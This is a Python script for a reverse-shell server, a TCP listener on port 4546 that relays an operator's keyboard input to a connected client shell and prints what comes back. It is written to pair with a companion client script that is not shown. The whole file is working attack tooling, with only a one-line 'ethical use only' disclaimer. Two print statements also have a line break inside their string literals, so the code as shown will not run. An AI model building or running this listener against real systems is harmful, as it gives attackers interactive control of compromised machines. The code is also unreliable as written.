
#!/usr/bin/env python3
"""
custom_netcat_svr_compat.py

A compatible reverse-shell **server** to pair with custom_netcat_cli_compat(_v2).py.

Features
- Raw, full-duplex byte streams (no blocking input())
- Sends QUIT token ":leave:" when local stdin hits EOF (Ctrl-D)
- Clean shutdown and socket half-closes
- TCP keepalive + TCP_NODELAY (best effort)

Usage
  python3 custom_netcat_svr_compat.py
Then start the client pointing to this host/port.

Ethical use only: run in your lab or on systems you are authorized to control.
"""
import socket
import sys
import os
import threading
import selectors
import signal
import time
import platform

HOST = "0.0.0.0"
PORT = 4546
QUIT_TOKEN = b":leave:"

# -------------------------
# Socket helpers
# -------------------------

def set_tcp_keepalive(sock: socket.socket):
    """Best-effort TCP keepalive tuning; safe to silently ignore if unsupported."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if hasattr(socket, "TCP_KEEPIDLE"):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)
        if hasattr(socket, "TCP_KEEPINTVL"):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
        if hasattr(socket, "TCP_KEEPCNT"):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    except Exception:
        pass

# -------------------------
# Stream forwarders
# -------------------------

def recv_to_stdout(conn: socket.socket, stop_evt: threading.Event):
    """Receive raw bytes from client and write to local stdout."""
    try:
        while not stop_evt.is_set():
            data = conn.recv(4096)
            if not data:
                break
            try:
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            except Exception:
                # Fallback decode for environments without binary stdout
                print(data.decode("utf-8", "replace"), end="", flush=True)
    except Exception:
        pass
    finally:
        stop_evt.set()
        try:
            conn.shutdown(socket.SHUT_RD)
        except Exception:
            pass


def stdin_to_send(conn: socket.socket, stop_evt: threading.Event):
    """Forward local stdin -> client. On EOF, send QUIT_TOKEN for graceful exit."""
    sel = selectors.DefaultSelector()
    try:
        sel.register(sys.stdin, selectors.EVENT_READ)
    except Exception:
        # Some environments may not allow selecting on stdin; we'll still try os.read
        pass

    try:
        while not stop_evt.is_set():
            events = sel.select(timeout=0.3) if sel.get_map() else [(None, None)]
            if not events:
                continue
            try:
                chunk = os.read(sys.stdin.fileno(), 4096)
            except BlockingIOError:
                continue
            except Exception:
                # Treat as EOF if stdin inaccessible
                chunk = b""

            if not chunk:
                # Local EOF -> ask client to exit
                try:
                    conn.sendall(QUIT_TOKEN)
                except Exception:
                    pass
                break
            try:
                conn.sendall(chunk)
            except Exception:
                break
    finally:
        stop_evt.set()
        try:
            conn.shutdown(socket.SHUT_WR)
        except Exception:
            pass

# -------------------------
# Session handler
# -------------------------

def handle_client(conn: socket.socket, addr):
    print(f"[+] Session from {addr[0]}:{addr[1]}")
    try:
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass
    set_tcp_keepalive(conn)

    stop_evt = threading.Event()
    t_recv = threading.Thread(target=recv_to_stdout, args=(conn, stop_evt), daemon=True)
    t_send = threading.Thread(target=stdin_to_send, args=(conn, stop_evt), daemon=True)
    t_recv.start(); t_send.start()

    try:
        # Idle loop until either worker thread signals stop
        while not stop_evt.is_set():
            time.sleep(0.2)
    except KeyboardInterrupt:
        stop_evt.set()
    finally:
        try:
            conn.close()
        except Exception:
            pass
        print("
[*] Session closed.")

# -------------------------
# Main listener
# -------------------------

def main():
    print(f"[+] Listening on {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        while True:
            try:
                conn, addr = s.accept()
            except KeyboardInterrupt:
                print("
[!] Shutting down listener.")
                break
            except Exception as e:
                print(f"[!] Accept failed: {e}")
                continue

            # Serve a single session to completion, then go back to listening
            with conn:
                handle_client(conn, addr)

if __name__ == "__main__":
    # Make Ctrl-C immediate on Unix
    if platform.system().lower().startswith("linux"):
        signal.signal(signal.SIGINT, signal.SIG_DFL)
    main()
